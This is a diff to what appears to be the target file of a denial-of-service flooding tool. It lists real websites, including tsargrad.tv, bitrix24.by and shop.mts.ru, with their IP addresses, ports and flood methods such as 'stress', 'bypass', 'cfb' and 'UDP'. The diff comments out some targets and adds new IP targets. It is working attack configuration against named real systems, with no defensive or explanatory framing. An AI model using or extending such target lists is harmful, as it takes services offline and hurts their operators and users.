@@ -13,8 +13,10 @@
 
 #https://tsargrad.tv/ http://tsargrad.tv/ --http-methods bypass cfb dgb
 
-https://bitrix24.by/ https://bitrix24.by/ 185.183.120.132:80 185.183.120.132:443 46.235.53.117:80 46.235.53.117:443 tcp://185.183.120.132:80 tcp://185.183.120.132:443 tcp://46.235.53.117:80 tcp://46.235.53.117:443 --http-methods stress bypass get dgb cfb 
+#https://bitrix24.by/ https://bitrix24.by/ 185.183.120.132:80 185.183.120.132:443 46.235.53.117:80 46.235.53.117:443 tcp://185.183.120.132:80 tcp://185.183.120.132:443 tcp://46.235.53.117:80 tcp://46.235.53.117:443 --http-methods stress bypass get dgb cfb 
 
-http://shop.mts.ru https://shop.mts.ru 178.248.232.150:80 178.248.232.150:443 https://178.248.232.150:443 tcp://178.248.232.150:80 tcp://178.248.232.150:443 --http-methods bypass dgb cfb stress
+#http://shop.mts.ru https://shop.mts.ru 178.248.232.150:80 178.248.232.150:443 https://178.248.232.150:443 tcp://178.248.232.150:80 tcp://178.248.232.150:443 --http-methods bypass dgb cfb stress
 
 #udp://92.223.100.53:53 udp://92.223.77.53:53 --http-methods UDP
+
+http://139.45.252.51:80 https://139.45.252.51:443 http://139.45.252.52:80 https://139.45.252.52:443 --http-methods stress --debug
